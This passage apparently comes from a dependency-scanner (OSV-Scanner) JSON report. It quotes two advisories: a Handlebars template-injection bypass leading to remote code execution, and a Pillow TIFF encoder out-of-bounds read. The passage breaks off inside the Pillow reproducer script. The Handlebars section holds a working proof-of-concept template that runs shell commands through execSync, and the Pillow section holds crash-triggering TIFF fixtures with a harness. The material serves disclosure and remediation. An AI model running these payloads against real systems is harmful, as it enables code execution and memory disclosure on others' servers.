              "fullDescription": {
                "markdown": "## Summary\n\nHandlebars can expose the `Function` constructor despite its prototype-access deny list. When a template reaches `Function.prototype`, its own `constructor` property is returned before the deny list is checked. An attacker who can render a controlled template with `allowProtoMethodsByDefault: true` can inject and execute arbitrary JavaScript, leading to Remote Code Execution on the server.\n\n## Description\n\n`lookupProperty` trusts own properties:\n\n```js\nif (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n  return result;\n}\n```\n\nNormally, prototype-derived values reach `resultIsAllowed`, which blocks dangerous method names such as `constructor`. However, `constructor` is itself an own property of prototype objects:\n\n```js\nFunction.prototype.constructor === Function;\nString.prototype.constructor === String;\nObject.prototype.constructor === Object;\n```\n\nAs a result, once a template reaches `Function.prototype`, looking up `constructor` returns `Function` without consulting the deny list.\n\n## Proof of Concept\n\nAn attacker needs to reach any prototype object where constructor is an own property, then access constructor to obtain Function. The shortest path requires only an accessible function in the template context:\n\n1. Access a function's prototype: {{lookup myFunction \"proto\"}} resolves to Function.prototype. The proto property is not in the deny list and is permitted when allowProtoMethodsByDefault is true (since the result is a function).\n2. Access constructor via own property bypass: {{lookup (lookup myFunction \"\\_\\_proto__\") \"constructor\"}} resolves to Function. Because Function.prototype.constructor is an own property of Function.prototype, hasOwnProperty returns true and lookupProperty returns the value without calling resultIsAllowed. The deny list entry constructor: false is never evaluated.\n3. Construct and execute arbitrary code: The attacker uses Function to create a function with attacker-controlled body content and triggers its execution through Handlebars' template rendering mechanics (e.g., #with calling functions, lambda processing, or #each iteration combined with apply).\n\n```javascript\nconst Handlebars = require('handlebars');\n\n// constructor deny list bypass via hasOwnProperty check in lookupProperty\nconst template = Handlebars.compile(\n    // construct code array from template string literal\n    '{{#with a}}' +\n      '{{lookup \"\" (push \"return process.mainModule.require(\\'child_process\\').execSync(\\'id\\').toString()\")}}' +\n      '{{lookup \"\" (pop)}}' +\n      '{{lookup \"\" (shift)}}' +\n    '{{/with}}' +\n\n    // access Function via own property bypass on Function.prototype.constructor\n    '{{lookup \"\" (@root.a.push (lookup (lookup fn \"__proto__\") \"constructor\"))}}' +\n\n    // #each sets depth0=Function without calling it, apply avoids hash body\n    '{{#each @root}}{{#if @index}}{{else}}' +\n      '{{#with (this.apply null @root.a)}}{{this}}{{/with}}' +\n    '{{/if}}{{/each}}'\n);\n\nconst result = template(\n    { fn: function(){}, a: [0] },\n    { allowProtoMethodsByDefault: true }\n);\n\nconsole.log(result.trim());\n\n// output: uid=1000(node) gid=1000(node) groups=1000(node)\n```\n\n## Workarounds\n\nDo not set `allowProtoMethodsByDefault: true` when compiling untrusted templates with untrusted data.\n\nIf you are using packages like [hbs](https://www.npmjs.com/package/hbs) which set `allowProtoMethodsByDefault: true` by default, you have to update Handlebars to the latest version.",
                "text": "## Summary\n\nHandlebars can expose the `Function` constructor despite its prototype-access deny list. When a template reaches `Function.prototype`, its own `constructor` property is returned before the deny list is checked. An attacker who can render a controlled template with `allowProtoMethodsByDefault: true` can inject and execute arbitrary JavaScript, leading to Remote Code Execution on the server.\n\n## Description\n\n`lookupProperty` trusts own properties:\n\n```js\nif (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n  return result;\n}\n```\n\nNormally, prototype-derived values reach `resultIsAllowed`, which blocks dangerous method names such as `constructor`. However, `constructor` is itself an own property of prototype objects:\n\n```js\nFunction.prototype.constructor === Function;\nString.prototype.constructor === String;\nObject.prototype.constructor === Object;\n```\n\nAs a result, once a template reaches `Function.prototype`, looking up `constructor` returns `Function` without consulting the deny list.\n\n## Proof of Concept\n\nAn attacker needs to reach any prototype object where constructor is an own property, then access constructor to obtain Function. The shortest path requires only an accessible function in the template context:\n\n1. Access a function's prototype: {{lookup myFunction \"proto\"}} resolves to Function.prototype. The proto property is not in the deny list and is permitted when allowProtoMethodsByDefault is true (since the result is a function).\n2. Access constructor via own property bypass: {{lookup (lookup myFunction \"\\_\\_proto__\") \"constructor\"}} resolves to Function. Because Function.prototype.constructor is an own property of Function.prototype, hasOwnProperty returns true and lookupProperty returns the value without calling resultIsAllowed. The deny list entry constructor: false is never evaluated.\n3. Construct and execute arbitrary code: The attacker uses Function to create a function with attacker-controlled body content and triggers its execution through Handlebars' template rendering mechanics (e.g., #with calling functions, lambda processing, or #each iteration combined with apply).\n\n```javascript\nconst Handlebars = require('handlebars');\n\n// constructor deny list bypass via hasOwnProperty check in lookupProperty\nconst template = Handlebars.compile(\n    // construct code array from template string literal\n    '{{#with a}}' +\n      '{{lookup \"\" (push \"return process.mainModule.require(\\'child_process\\').execSync(\\'id\\').toString()\")}}' +\n      '{{lookup \"\" (pop)}}' +\n      '{{lookup \"\" (shift)}}' +\n    '{{/with}}' +\n\n    // access Function via own property bypass on Function.prototype.constructor\n    '{{lookup \"\" (@root.a.push (lookup (lookup fn \"__proto__\") \"constructor\"))}}' +\n\n    // #each sets depth0=Function without calling it, apply avoids hash body\n    '{{#each @root}}{{#if @index}}{{else}}' +\n      '{{#with (this.apply null @root.a)}}{{this}}{{/with}}' +\n    '{{/if}}{{/each}}'\n);\n\nconst result = template(\n    { fn: function(){}, a: [0] },\n    { allowProtoMethodsByDefault: true }\n);\n\nconsole.log(result.trim());\n\n// output: uid=1000(node) gid=1000(node) groups=1000(node)\n```\n\n## Workarounds\n\nDo not set `allowProtoMethodsByDefault: true` when compiling untrusted templates with untrusted data.\n\nIf you are using packages like [hbs](https://www.npmjs.com/package/hbs) which set `allowProtoMethodsByDefault: true` by default, you have to update Handlebars to the latest version."
              },
              "help": {
                "markdown": "**Your dependency is vulnerable to [CVE-2026-106445](https://osv.dev/CVE-2026-106445)**.\n\n## [GHSA-p8wg-vrv2-v86f](https://osv.dev/GHSA-p8wg-vrv2-v86f)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ## Summary\n\u003e \n\u003e Handlebars can expose the `Function` constructor despite its prototype-access deny list. When a template reaches `Function.prototype`, its own `constructor` property is returned before the deny list is checked. An attacker who can render a controlled template with `allowProtoMethodsByDefault: true` can inject and execute arbitrary JavaScript, leading to Remote Code Execution on the server.\n\u003e \n\u003e ## Description\n\u003e \n\u003e `lookupProperty` trusts own properties:\n\u003e \n\u003e ```js\n\u003e if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n\u003e   return result;\n\u003e }\n\u003e ```\n\u003e \n\u003e Normally, prototype-derived values reach `resultIsAllowed`, which blocks dangerous method names such as `constructor`. However, `constructor` is itself an own property of prototype objects:\n\u003e \n\u003e ```js\n\u003e Function.prototype.constructor === Function;\n\u003e String.prototype.constructor === String;\n\u003e Object.prototype.constructor === Object;\n\u003e ```\n\u003e \n\u003e As a result, once a template reaches `Function.prototype`, looking up `constructor` returns `Function` without consulting the deny list.\n\u003e \n\u003e ## Proof of Concept\n\u003e \n\u003e An attacker needs to reach any prototype object where constructor is an own property, then access constructor to obtain Function. The shortest path requires only an accessible function in the template context:\n\u003e \n\u003e 1. Access a function's prototype: {{lookup myFunction \"proto\"}} resolves to Function.prototype. The proto property is not in the deny list and is permitted when allowProtoMethodsByDefault is true (since the result is a function).\n\u003e 2. Access constructor via own property bypass: {{lookup (lookup myFunction \"\\_\\_proto__\") \"constructor\"}} resolves to Function. Because Function.prototype.constructor is an own property of Function.prototype, hasOwnProperty returns true and lookupProperty returns the value without calling resultIsAllowed. The deny list entry constructor: false is never evaluated.\n\u003e 3. Construct and execute arbitrary code: The attacker uses Function to create a function with attacker-controlled body content and triggers its execution through Handlebars' template rendering mechanics (e.g., #with calling functions, lambda processing, or #each iteration combined with apply).\n\u003e \n\u003e ```javascript\n\u003e const Handlebars = require('handlebars');\n\u003e \n\u003e // constructor deny list bypass via hasOwnProperty check in lookupProperty\n\u003e const template = Handlebars.compile(\n\u003e     // construct code array from template string literal\n\u003e     '{{#with a}}' +\n\u003e       '{{lookup \"\" (push \"return process.mainModule.require(\\'child_process\\').execSync(\\'id\\').toString()\")}}' +\n\u003e       '{{lookup \"\" (pop)}}' +\n\u003e       '{{lookup \"\" (shift)}}' +\n\u003e     '{{/with}}' +\n\u003e \n\u003e     // access Function via own property bypass on Function.prototype.constructor\n\u003e     '{{lookup \"\" (@root.a.push (lookup (lookup fn \"__proto__\") \"constructor\"))}}' +\n\u003e \n\u003e     // #each sets depth0=Function without calling it, apply avoids hash body\n\u003e     '{{#each @root}}{{#if @index}}{{else}}' +\n\u003e       '{{#with (this.apply null @root.a)}}{{this}}{{/with}}' +\n\u003e     '{{/if}}{{/each}}'\n\u003e );\n\u003e \n\u003e const result = template(\n\u003e     { fn: function(){}, a: [0] },\n\u003e     { allowProtoMethodsByDefault: true }\n\u003e );\n\u003e \n\u003e console.log(result.trim());\n\u003e \n\u003e // output: uid=1000(node) gid=1000(node) groups=1000(node)\n\u003e ```\n\u003e \n\u003e ## Workarounds\n\u003e \n\u003e Do not set `allowProtoMethodsByDefault: true` when compiling untrusted templates with untrusted data.\n\u003e \n\u003e If you are using packages like [hbs](https://www.npmjs.com/package/hbs) which set `allowProtoMethodsByDefault: true` by default, you have to update Handlebars to the latest version.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml | handlebars | 4.7.9 |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | handlebars | 4.7.9 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-p8wg-vrv2-v86f | handlebars | 4.7.10 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-106445\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-106445\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-106445](https://osv.dev/CVE-2026-106445)**.\n\n## [GHSA-p8wg-vrv2-v86f](https://osv.dev/GHSA-p8wg-vrv2-v86f)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ## Summary\n\u003e \n\u003e Handlebars can expose the `Function` constructor despite its prototype-access deny list. When a template reaches `Function.prototype`, its own `constructor` property is returned before the deny list is checked. An attacker who can render a controlled template with `allowProtoMethodsByDefault: true` can inject and execute arbitrary JavaScript, leading to Remote Code Execution on the server.\n\u003e \n\u003e ## Description\n\u003e \n\u003e `lookupProperty` trusts own properties:\n\u003e \n\u003e ```js\n\u003e if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n\u003e   return result;\n\u003e }\n\u003e ```\n\u003e \n\u003e Normally, prototype-derived values reach `resultIsAllowed`, which blocks dangerous method names such as `constructor`. However, `constructor` is itself an own property of prototype objects:\n\u003e \n\u003e ```js\n\u003e Function.prototype.constructor === Function;\n\u003e String.prototype.constructor === String;\n\u003e Object.prototype.constructor === Object;\n\u003e ```\n\u003e \n\u003e As a result, once a template reaches `Function.prototype`, looking up `constructor` returns `Function` without consulting the deny list.\n\u003e \n\u003e ## Proof of Concept\n\u003e \n\u003e An attacker needs to reach any prototype object where constructor is an own property, then access constructor to obtain Function. The shortest path requires only an accessible function in the template context:\n\u003e \n\u003e 1. Access a function's prototype: {{lookup myFunction \"proto\"}} resolves to Function.prototype. The proto property is not in the deny list and is permitted when allowProtoMethodsByDefault is true (since the result is a function).\n\u003e 2. Access constructor via own property bypass: {{lookup (lookup myFunction \"\\_\\_proto__\") \"constructor\"}} resolves to Function. Because Function.prototype.constructor is an own property of Function.prototype, hasOwnProperty returns true and lookupProperty returns the value without calling resultIsAllowed. The deny list entry constructor: false is never evaluated.\n\u003e 3. Construct and execute arbitrary code: The attacker uses Function to create a function with attacker-controlled body content and triggers its execution through Handlebars' template rendering mechanics (e.g., #with calling functions, lambda processing, or #each iteration combined with apply).\n\u003e \n\u003e ```javascript\n\u003e const Handlebars = require('handlebars');\n\u003e \n\u003e // constructor deny list bypass via hasOwnProperty check in lookupProperty\n\u003e const template = Handlebars.compile(\n\u003e     // construct code array from template string literal\n\u003e     '{{#with a}}' +\n\u003e       '{{lookup \"\" (push \"return process.mainModule.require(\\'child_process\\').execSync(\\'id\\').toString()\")}}' +\n\u003e       '{{lookup \"\" (pop)}}' +\n\u003e       '{{lookup \"\" (shift)}}' +\n\u003e     '{{/with}}' +\n\u003e \n\u003e     // access Function via own property bypass on Function.prototype.constructor\n\u003e     '{{lookup \"\" (@root.a.push (lookup (lookup fn \"__proto__\") \"constructor\"))}}' +\n\u003e \n\u003e     // #each sets depth0=Function without calling it, apply avoids hash body\n\u003e     '{{#each @root}}{{#if @index}}{{else}}' +\n\u003e       '{{#with (this.apply null @root.a)}}{{this}}{{/with}}' +\n\u003e     '{{/if}}{{/each}}'\n\u003e );\n\u003e \n\u003e const result = template(\n\u003e     { fn: function(){}, a: [0] },\n\u003e     { allowProtoMethodsByDefault: true }\n\u003e );\n\u003e \n\u003e console.log(result.trim());\n\u003e \n\u003e // output: uid=1000(node) gid=1000(node) groups=1000(node)\n\u003e ```\n\u003e \n\u003e ## Workarounds\n\u003e \n\u003e Do not set `allowProtoMethodsByDefault: true` when compiling untrusted templates with untrusted data.\n\u003e \n\u003e If you are using packages like [hbs](https://www.npmjs.com/package/hbs) which set `allowProtoMethodsByDefault: true` by default, you have to update Handlebars to the latest version.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml | handlebars | 4.7.9 |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | handlebars | 4.7.9 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-p8wg-vrv2-v86f | handlebars | 4.7.10 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-106445\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-106445\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
              },
              "id": "CVE-2026-106445",
              "name": "CVE-2026-106445",
              "properties": {
                "security-severity": "9.2"
              },
              "relationships": [],
              "shortDescription": {
                "markdown": "CVE-2026-106445: Handlebars: JavaScript Injection via Own Property Check Bypass",
                "text": "CVE-2026-106445: Handlebars: JavaScript Injection via Own Property Check Bypass"
              }
            },
            {
              "deprecatedIds": [
                "CVE-2026-112896",
                "BIT-pillow-2026-112896",
                "GHSA-pchr-8j38-3x4p"
              ],
              "fullDescription": {
                "markdown": "## Summary\n\nA small attacker-supplied TIFF can be opened and loaded normally, then reach an out-of-bounds read when an application saves it back to TIFF with retained metadata. The fixed reproducer is a 1×1, 16-bit grayscale, PackBits-compressed TIFF containing tag 320 (ColorMap) with **768 SHORT values**: three zero-filled planes of 256 entries each. No Python object is forged and no metadata is injected after loading.\n\nPillow's TIFF encoder allocates **768 × 2 = 1536 bytes**, then passes three plane pointers separated by 256 SHORT entries to libtiff. With `BitsPerSample = 16`, libtiff instead expects **65536 SHORT values per plane** and attempts a **131072-byte read** from a plane pointer. Existing ASAN observations identify a heap-buffer-overflow READ crossing the 1536-byte allocation made in `PyImaging_LibTiffEncoderNew`.\n\nThe malformed ColorMap need not be a valid palette for this grayscale image. The issue is that accepted metadata is forwarded on save without reconciling the fixed plane extent with the effective sample depth. Opening/loading alone is not the demonstrated fault; the encoder path is required.\n\n## Impact and prerequisites\n\nAn application must accept the input, retain the relevant TIFF metadata, and invoke the libtiff-backed TIFF save path. The observed consequence is an out-of-bounds read and ASAN termination. Process-memory exposure during encoding is a potential consequence, **not demonstrated by extracting arbitrary heap contents in this report**. No arbitrary read primitive, full memory-disclosure chain, code execution, address-space bypass, or cross-process effect is claimed.\n\nThe 131072-byte attempted copy is not the number of bytes proven disclosed. This report does not run a synthetic-canary serializer or collect an unsanitized encoded output.\n\n## Tested environment and limits of the evidence\n\nThe existing observations were recorded on August 30, 2026, with **CPython 3.11.8 on macOS ARM64**, using the unmodified official **Pillow 12.3.0** wheel and its bundled **libtiff 4.7.1**:\n\n- Wheel: `pillow-12.3.0-cp311-cp311-macosx_11_0_arm64.whl`\n- Wheel size: `4785266` bytes\n- Wheel SHA-256: `37d6d0a00072fd2948eb22bce7e1475f34569d90c87c59f7a2ec59541b77f7a6`\n- Pillow source revision: `bb1d8e8ab8d29048624d96e3ee53cecf7c13d13d`\n- Bundled libtiff SHA-256: `e8988717b7470394a47d5ccd343130796b24ee70b6d885d3818e0e0b53238be1`\n\nApple's ASAN runtime was injected at process startup. This is **not an ASAN-rebuilt Pillow wheel**; allocation/memcpy interception detects the reported boundary violation, but the wheel's native instructions are not comprehensively instrumented.\n\nOnly this concrete full-package environment is established here. No affected-version range, current development-branch result, or patched release is asserted. Severity is **Unknown**; no CVSS score is proposed.\n\nSeparate earlier evidence reached the original Pillow 8.0.1 encoder constructor compiled as a component against a modern Python/libtiff environment. **That was not a complete Pillow 8.0.1 installation** and does not establish the historical package's full runtime behavior. It is not part of this reproducer or an affected-version range.\n\n## Observed evidence and controls\n\nThe earlier integration harness performed the natural sequence `Image.open(BytesIO(input))`, `image.load()`, then `image.save(BytesIO(), format=\"TIFF\")`, without replacing the image's metadata. Each case was recorded three times:\n\n| Original fixture | Bytes | Recorded result |\n| --- | ---: | --- |\n| `colormap16` | 1685 | Loaded as `I;16`; save terminated with ASAN exit 86, READ of size 131072 crossing a 1536-byte heap region (3/3). |\n| `colormap8` | 1684 | Same fixed ColorMap, but 8-bit samples; save succeeded and retained SHORT/count 768 (3/3). |\n| `colormap_absent` | 137 | Same 16-bit geometry without ColorMap; save succeeded (3/3). |\n\nAddress-free summary of the recorded native diagnostic:\n\n```text\nAddressSanitizer: heap-buffer-overflow\nREAD of size 131072\n0 bytes after 1536-byte region\nCopy path: memcpy -\u003e _TIFFmemcpy -\u003e setByteArray -\u003e _TIFFsetShortArrayExt\n           -\u003e _TIFFVSetField -\u003e TIFFVSetField -\u003e ImagingLibTiffSetField\n           -\u003e PyImaging_LibTiffEncoderNew\nAllocation: calloc -\u003e PyImaging_LibTiffEncoderNew\n```\n\nInput SHA-256 values (also enforced inside the script):\n\n- `colormap16`: `5f38e0ead90b97949fb0c98c63f9c68d00ba9181db6631ecb8927376dcc75f4d`\n- `colormap8`: `fdb26d9135549ed44824901985086c5ee4f06515699ca3291e498c523935405c`\n- `colormap_absent`: `bd54979624f3ffb713342e0458caff9e17c477f940cda2f0960feebfabbc9556`\n\n## Root cause and source references\n\n- [Pillow `src/encode.c`, lines 870–899, pinned revision](https://github.com/python-pillow/Pillow/blob/bb1d8e8ab8d29048624d96e3ee53cecf7c13d13d/src/encode.c#L870): the ColorMap tuple must contain exactly 768 entries; a 1536-byte allocation is passed with a fixed stride of 256. The check does not reconcile that extent with `BitsPerSample`.\n- [Pillow `src/PIL/TiffImagePlugin.py`, lines 1944–1991, pinned revision](https://github.com/python-pillow/Pillow/blob/bb1d8e8ab8d29048624d96e3ee53cecf7c13d13d/src/PIL/TiffImagePlugin.py#L1944): save carries supplied tags into the libtiff encoder and sorts the tags, so sample depth is established before ColorMap.\n- [libtiff `tif_dir.c`, lines 441–448, pinned revision](https://gitlab.com/libtiff/libtiff/-/blob/5fe20d0e9aba49a6a350ed533459d1505203838f/libtiff/tif_dir.c#L441): `TIFFTAG_COLORMAP` computes the per-plane count as `1L \u003c\u003c td-\u003etd_bitspersample` and copies that many SHORTs from each pointer.\n\nThe reported boundary is Pillow's construction of a fixed-sized array for a native API whose required size depends on metadata; this does not establish a standalone libtiff defect for a correctly sized caller buffer.\n\n## Prior art and disclosure scope\n\n[Pillow PR #5148](https://github.com/python-pillow/Pillow/pull/5148), merged December 28, 2020, is related TIFF metadata prior art, but its archived diff replaces a short-lived stack field-name pointer with the persistent literal `\"CustomField\"`. That is a **different field-name-lifetime fix**, not this plane-size mismatch. The reviewed material does not establish an exact prior public report or fix for this root, and **novelty is not asserted**. This specific report remains NOT_SENT; association with other observations is not a prior disclosure of it.\n\n## Reproduction instructions\n\nUse an **already reviewed, existing** installation of the exact wheel above, an existing compatible macOS ARM64 CPython 3.11 interpreter, and an existing compatible Apple ASAN runtime. `--package-path` is the absolute directory containing `PIL`, not the `PIL` directory itself. The script does not install, download, build, patch, or submit anything. It checks selected key package files against the original installation's hashes and checks the loaded package/version; these checks are not a full installation attestation.\n\nSave the complete Python block below as `reproduce.py` and run:\n\n```sh\npython3.11 -I -S -B reproduce.py \\\n  --package-path /absolute/path/to/reviewed/site-packages \\\n  --asan-runtime /absolute/path/to/reviewed/libclang_rt.asan_osx_dynamic.dylib\n```\n\nBoth arguments are required. The runtime must be loaded at child startup, not by late `dlopen`. Each child resolves `__asan_init`, `__asan_address_is_poisoned`, and `__asan_region_is_poisoned` in its actual process symbol table **before importing Pillow or opening a fixture**. Merely setting `DYLD_INSERT_LIBRARIES` is not accepted as proof of ASAN availability. A missing symbol or package mismatch prevents the operation.\n\nEach of the three cases runs once in a separate child with a **30-second wall limit, 10-second hard CPU limit, core dumps disabled, and 1 MiB regular-file-size limit**. The parent supplies a clean allowlisted environment, isolated Python startup (`-I -S -B`), an empty temporary working directory, no stdin, and a 128 KiB combined pipe-output cap. Timeout/output-cap handling kills the child's process group. These limits are containment measures, not a security sandbox. No TIFF is written to disk. Temporary directories are removed; raw diagnostics are never forwarded or persisted.\n\nThe compressed/base64 constants below are the **unchanged original benign TIFF fixtures**, with decompressed size and SHA-256 checks. There are no external fixture dependencies. The standalone script supplied with this description is byte-for-byte the same as this block.\n\n**Separate August 31, 2026 inline validation:** the exact embedded standalone script passed all three fixed cases: one ASan READ of 131,072 bytes crossing a 1,536-byte allocation and two passing controls. Child guards and limits passed, with no timeout. This is additional bounded evidence, separate from earlier runs; no new build, install, full historical chain or older-version integration replay was performed.\n\n## Expected results from the standalone script\n\nCases run in order: `colormap8`, `colormap_absent`, `colormap16`. Every printed line should have `guard_passed: true`, `within_limits: true`, and `expected_observation: true`. The first two require successful saves and the expected retained sample-depth/ColorMap fields. The last requires ASAN exit 86 **and** the specific READ/extent/stack signatures, not merely any crash. Only the two controls inspect encoded metadata; the unsafe case never exports an encoded TIFF.\n\nThe parent exits 0 only if all three expectations match; 1 means a case did not match (including guard failure or a changed ASAN diagnostic), and 2 means parent setup failed. A failed guard, timeout, unrelated crash, or missing diagnostic is **inconclusive**, not evidence that the defect is absent. Do not bypass the ASAN guard to obtain an output TIFF.\n\n## Complete standalone reproducer\n\n```python\nimport argparse\nimport base64\nimport ctypes\nimport hashlib\nimport io\nimport json\nimport os\nfrom pathlib import Path\nimport platform\nimport resource\nimport selectors\nimport struct\nimport subprocess\nimport sys\nimport tempfile\nimport time\nimport zlib\n\n\nFIXTURES = {'colormap8': [1684,\n               'fdb26d9135549ed44824901985086c5ee4f06515699ca3291e498c523935405c',\n               'eNrz9NRi4GBgYOBmYGBkYWAEssAYic3EyAymQaqYoWzWBgYGNigbhAWh6iexMTCIIomLIZkjDmUzAbEMkhoHIJsBiCYxjIJRMApGwSgY2QAAPu0DiA=='],\n 'colormap_absent': [137,\n                     'bd54979624f3ffb713342e0458caff9e17c477f940cda2f0960feebfabbc9556',\n                     'eNrz9NRi4GBgYOBiYGBkYWAEssAYic3EyAymBYCYGcpmbWBgYIOyQVgQqr4NiEWRxMWQzBGHspmBWAZJDQOEBgDj8wKm'],\n 'colormap16': [1685,\n                '5f38e0ead90b97949fb0c98c63f9c68d00ba9181db6631ecb8927376dcc75f4d',\n                'eNrz9NRi4GBgYOBmYGBkYWAEssAYic3EyAymBYCYGcpmbWBgYIOyQVgQqn4SGwODKJK4GJI54lA2MxDLIKlxALJBgpMYRsEoGAWjYBSMZACsEwB78wOS']}\nPACKAGE_PINS = {'PIL/ImageFile.py': '983c4f35e0c51046d4c636998ec77000cd2da208870a03b205e104cd0b2df629',\n 'PIL/_version.py': 'fe7d75d4019326aca24ae57d4ab190cd62ba1225b175051119cd61cd87e42b1d',\n 'PIL/__init__.py': '7361b6ad3878589affe5956e4a4da24d71398b0891fd3a8c15e9362217b4ca01',\n 'PIL/features.py': '14f904863b416914aaa6480735876ec31885b7272ee0d8d92b010c5b1b5e98f5',\n 'PIL/TiffTags.py': '766dea350424b9a2caab3513be794689403c2b7222cd038006f69cff08edb45d',\n 'PIL/TiffImagePlugin.py': '440b2a3a80b280d18cda3fc70d9fd206e2fa44e9897c9550f70b51395047b273',\n 'PIL/_imaging.cpython-311-darwin.so': '6d09b1fb925779fff32b5b8a4c348a42c201d350d0e0fd8cdc00410b6779e596',\n 'PIL/Image.py': '04af3f2db7ffdd61e829fa7aa8f5481d394a0a4129a8fd8aa5b13908928fcd6d',\n 'PIL/.dylibs/libtiff.6.dylib': 'e8988717b7470394a47d5ccd343130796b24ee70b6d885d3818e0e0b53238be1',\n 'pillow-12.3.0.dist-info/WHEEL': 'de2586b77651a8bf1b7778c3609979713ebc901784a837fca80ed4969fc82e57',\n 'pillow-12.3.0.dist-info/METADATA': '8fc07146cab33ef7582361dab6eac596d340b03ec648f18217da7894f73838c8'}\nCASES = tuple(FIXTURES)\nWALL_SECONDS = 30\nFILE_LIMIT = 1024 * 1024\nPIPE_LIMIT = 128 * 1024\n\n\ndef limits():\n    resource.setrlimit(resource.RLIMIT_CORE, (0, 0))\n    resource.setrlimit(resource.RLIMIT_CPU, (10, 10))\n    resource.setrlimit(resource.RLIMIT_FSIZE, (FILE_LIMIT, FILE_LIMIT))\n\n\ndef fixture(case):\n    size, expected_hash, encoded = FIXTURES[case]\n    decoder = zlib.decompressobj()\n    data = decoder.decompress(base64.b64decode(encoded, validate=True), size + 1)\n    if (len(data) != size or not decoder.eof or decoder.unused_data\n            or decoder.unconsumed_tail\n            or hashlib.sha256(data).hexdigest() != expected_hash):\n        raise ValueError(\"fixture integrity check failed\")\n    return data\n\n\ndef field(data, wanted):\n    if len(data) \u003c 8 or data[:4] not in (b\"II*\\0\", b\"MM\\0*\"):\n        raise ValueError(\"not classic TIFF\")\n    endian = \"\u003c\" if data[:2] == b\"II\" else \"\u003e\"\n    directory = struct.unpack_from(endian + \"I\", data, 4)[0]\n    count = struct.unpack_from(endian + \"H\", data, directory)[0]\n    if directory + 2 + count * 12 + 4 \u003e len(data):\n        raise ValueError(\"truncated directory\")\n    for number in range(count):\n        offset = directory + 2 + number * 12\n        tag, kind, length = struct.unpack_from(endian + \"HHI\", data, offset)\n        if tag != wanted:\n            continue\n        size = {1: 1, 2: 1, 3: 2, 4: 4, 7: 1}[kind] * length\n        start = offset + 8 if size \u003c= 4 else struct.unpack_from(endian + \"I\", data, offset + 8)[0]\n        if start + size \u003e len(data):\n            raise ValueError(\"truncated field\")\n        return kind, length, data[start:start + size], endian\n    return None\n\n\ndef checked_image_module(package):\n    if (sys.implementation.name != \"cpython\" or sys.version_info[:2] != (3, 11)\n            or sys.platform != \"darwin\" or platform.machine() != \"arm64\"):\n        raise RuntimeError(\"requires macOS ARM64 CPython 3.11\")\n    for relative, expected in PACKAGE_PINS.items():\n        path = (package / relative).resolve(strict=True)\n        if not path.is_relative_to(package) or hashlib.sha256(path.read_bytes()).hexdigest() != expected:\n            raise RuntimeError(\"reviewed wheel file mismatch\")\n    process_symbols = ctypes.CDLL(None)\n    for symbol in (\"__asan_init\", \"__asan_address_is_poisoned\", \"__asan_region_is_poisoned\"):\n        getattr(process_symbols, symbol)\n    sys.path.insert(0, str(package))\n    from PIL import Image, features\n    if (Image.__version__ != \"12.3.0\" or features.version(\"libtiff\") != \"4.7.1\"\n            or Path(Image.__file__).resolve() != package / \"PIL/Image.py\"\n            or Path(Image.core.__file__).resolve() != package / \"PIL/_imaging.cpython-311-darwin.so\"):\n        raise RuntimeError(\"unexpected Pillow or libtiff\")\n    return Image\n\n\ndef emit(descriptor, message):\n    os.write(descriptor, (json.dumps(message, sort_keys=True) + \"\\n\").encode(\"ascii\"))\n\n\ndef child(case, package):\n    descriptor = os.dup(1)\n    with open(os.devnull, \"wb\") as quiet:\n        os.dup2(quiet.fileno(), 1)\n    try:\n        image_module = checked_image_module(package)\n        data = fixture(case)\n        with image_module.open(io.BytesIO(data)) as image:\n            image.load()\n            if image.size != (1, 1) or image.info.get(\"compression\") != \"packbits\":\n                raise ValueError(\"unexpected input geometry\")\n            bits = 8 if case == \"colormap8\" else 16\n            if image.tag_v2[258] != (bits,):\n                raise ValueError(\"unexpected sample width\")\n            if case == \"colormap_absent\":\n                if 320 in image.tag_v2:\n                    raise ValueError(\"unexpected ColorMap\")\n            elif image.tag_v2[320] != (0,) * 768:\n                raise ValueError(\"unexpected ColorMap planes\")\n            emit(descriptor, {\"ready\": True})\n           